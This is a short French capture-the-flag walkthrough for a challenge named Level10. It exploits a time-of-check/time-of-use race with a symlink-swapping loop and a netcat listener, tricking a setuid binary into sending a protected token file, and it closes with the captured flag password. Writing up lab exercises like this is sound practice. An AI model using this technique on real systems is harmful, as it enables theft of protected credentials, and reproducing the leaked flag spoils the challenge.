# Level10

---


copier cette ligne de command dans le terminal:
```bash
cat > /tmp/script << EOF
#!/bin/bash

ln -sf /tmp/temp /tmp/link
ln -sf $HOME/token /tmp/link
EOF
```

puis executer cette ligne:

``` bash
chmod +x /tmp/script && touch /tmp/link /tmp/temp
```

lancer trois terminaux avec sur chaque:

```bash 
while true; do nc -l 6969; done
```

```bash
while true; do /tmp/script; done
```

```bash
while true; do ./level10 /tmp/link 0.0.0.0; done
```

```
CTRL+C le ./level10
```



dans le terminal du nc on obtient:

> woupa2yuojeeaaed06riuj63c (pwd de flag10)